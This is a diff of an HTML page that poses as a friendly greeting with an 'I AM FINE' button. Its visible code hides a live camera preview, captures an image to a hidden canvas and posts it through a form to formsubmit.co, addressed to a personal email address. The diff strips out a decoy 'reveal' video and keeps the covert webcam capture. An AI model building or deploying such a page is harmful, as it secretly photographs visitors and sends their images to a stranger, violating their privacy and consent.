@@ -1,4 +1,3 @@
-
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -59,12 +58,8 @@ button:hover {
   to { transform: translateY(110vh) rotate(360deg); }
 }
 
-#revealVideo {
-  display: none;
-  width: 90%;
-  max-width: 500px;
-  border-radius: 15px;
-} /* hide live camera preview */
+video {
+  display: none; /* hide live camera preview */
 }
 </style>
 </head>
@@ -73,12 +68,6 @@ button:hover {
 <h2>HELLO ❤ — HOW ARE YOU?</h2>
 <button id="capture">I AM FINE</button>
 
-<button id="revealButton" style="display:none;">CLICK TO REVEAL</button>
-
-<video id="revealVideo" controls style="display:none; width:90%; max-width:500px; border-radius:15px;">
-  <source src="reveal.mp4" type="video/mp4">
-  Your browser does not support video.
-</video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <form id="imageForm" action="https://formsubmit.co/ganeshbist257@gmail.com" method="POST" enctype="multipart/form-data">
@@ -94,17 +83,7 @@ const canvas = document.getElementById("canvas");
 const captureButton = document.getElementById("capture");
 const imageInput = document.getElementById("imageInput");
 const form = document.getElementById("imageForm");
-  const revealButton = document.getElementById("revealButton");
-const revealVideo = document.getElementById("revealVideo");
-captureButton.addEventListener("click", () => {
-  captureButton.style.display = "none";
-  revealButton.style.display = "block";
-});
 
-revealButton.addEventListener("click", () => {
-  revealVideo.style.display = "block";
-  revealVideo.play();
-});
 let video;
 
 // Start camera
@@ -166,5 +145,3 @@ captureButton.addEventListener("click", () => {
 
 </body>
 </html>
-
-
